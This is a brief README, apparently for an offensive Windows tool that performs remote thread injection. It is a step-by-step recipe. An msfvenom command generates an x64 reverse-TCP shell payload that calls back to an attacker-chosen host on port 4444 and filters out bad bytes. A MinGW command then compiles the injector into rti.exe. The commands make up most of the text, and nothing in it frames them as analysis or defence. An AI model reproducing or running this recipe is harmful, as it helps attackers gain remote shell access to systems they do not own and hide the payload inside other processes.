## Remote Thread Injection Using Standard Windows APIs
create your shellcode and replace it in code:
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=4444 -b '\x00\x0a\x0d' -f c
```

compile it in kali using **MinGW**:
```sh
x86_64-w64-mingw32-gcc main.c -o rti.exe
```
